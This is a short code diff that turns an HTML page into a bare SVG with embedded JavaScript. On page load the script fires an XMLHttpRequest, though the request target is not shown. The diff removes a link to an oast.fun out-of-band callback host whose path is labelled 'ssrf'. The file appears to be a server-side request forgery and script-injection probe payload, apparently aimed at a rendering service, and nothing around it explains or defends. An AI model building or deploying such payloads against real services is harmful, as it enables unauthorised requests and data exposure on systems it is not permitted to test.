@@ -1,19 +1,4 @@
-<!DOCTYPE html>
-<html>
-<head>
-  <title>SVG with XMLHttpRequest</title>
-  <style>
-    #svg-container {
-      width: 200px;
-      height: 200px;
-    }
-  </style>
-</head>
-<body>
-  <a href="https://cfgbvm62vtc0000dvwn0g8af74hyyyyyb.oast.fun/flourish/ssrf">hreef</a>
-  <h1>SVG with XMLHttpRequest</h1>
-  <div id="svg-container">
-    <svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">
+<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">
       <script type="text/javascript">
         document.addEventListener("DOMContentLoaded", function() {
           var xhr = new XMLHttpRequest();
@@ -29,6 +14,3 @@
       </script>
       <rect width="200" height="200" fill="lightblue" />
     </svg>
-  </div>
-</body>
-</html>
